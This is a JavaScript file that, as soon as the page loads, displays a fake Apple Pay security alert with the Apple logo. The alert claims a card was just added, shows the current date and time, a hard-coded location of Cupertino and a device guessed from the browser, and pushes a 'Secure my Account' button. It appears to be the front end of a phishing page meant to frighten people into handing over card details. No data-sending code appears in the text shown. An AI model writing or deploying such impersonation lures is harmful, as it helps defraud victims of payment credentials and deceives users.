// Apple Pay Security Modal
document.addEventListener('DOMContentLoaded', function() {
    createSecurityModal();
    showSecurityModal();
});

function createSecurityModal() {
    // Create modal overlay
    const modalOverlay = document.createElement('div');
    modalOverlay.className = 'security-modal-overlay';
    modalOverlay.innerHTML = `
        <div class="security-modal-container">
            <div class="security-modal-header">
                <svg class="apple-logo" width="30" height="36" viewBox="0 0 30 36" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M25.826 18.714c-.056-6.064 4.954-8.978 5.173-9.118-2.818-4.123-7.203-4.688-8.763-4.752-3.731-.389-7.276 2.197-9.17 2.197-1.894 0-4.824-2.141-7.931-2.084-4.08.056-7.838 2.365-9.937 6.019-4.235 7.354-.108 18.235 3.045 24.194 1.546 2.923 3.388 6.206 5.812 6.093 2.367-.113 3.26-1.533 6.122-1.533 2.862 0 3.699 1.533 6.206 1.477 2.565-.056 4.152-2.998 5.698-5.921 1.784-3.388 2.518-6.663 2.574-6.832-.056-.057-4.938-1.895-4.994-7.516l.165-.224z" fill="#000"/>
                    <path d="M20.832 6.019c1.29-1.546 2.14-3.668 1.951-5.847-1.838.113-4.123 1.234-5.47 2.78-1.178 1.347-2.253 3.555-1.951 5.622 2.084.113 4.225-1.009 5.47-2.555z" fill="#000"/>
                </svg>
            </div>
            <div class="security-modal-content">
                <h2 class="security-modal-title">Your card has been added to Apple Pay</h2>
                <p class="security-modal-warning">If you didn't do this, relink your card to avoid unauthorized access.</p>
                
                <div class="security-modal-details">
                    <div class="detail-item">
                        <span class="detail-label">Date:</span>
                        <span class="detail-value">${getCurrentDate()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Time:</span>
                        <span class="detail-value">${getCurrentTime()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Country:</span>
                        <span class="detail-value">${getUserCountry()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">City:</span>
                        <span class="detail-value">${getUserCity()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Device:</span>
                        <span class="detail-value">${getAppleDevice()}</span>
                    </div>
                </div>
                
                <button class="security-modal-button">Secure my Account</button>
            </div>
        </div>
    `;

    document.body.appendChild(modalOverlay);
}

function showSecurityModal() {
    const modal = document.querySelector('.security-modal-overlay');
    setTimeout(() => {
        modal.classList.add('show');
    }, 500);
}

function getCurrentDate() {
    const now = new Date();
    return now.toLocaleDateString('en-US', { 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric' 
    });
}

function getCurrentTime() {
    const now = new Date();
    return now.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: true 
    });
}

function getUserCountry() {
    return 'United States';
}

function getUserCity() {
    return 'Cupertino';
}

function getAppleDevice() {
    const userAgent = navigator.userAgent;
    if (/iPad/.test(userAgent)) return 'iPad';
    if (/iPhone/.test(userAgent)) return 'iPhone';
    if (/Mac/.test(userAgent)) return 'MacBook';
    return 'Apple Device';
}
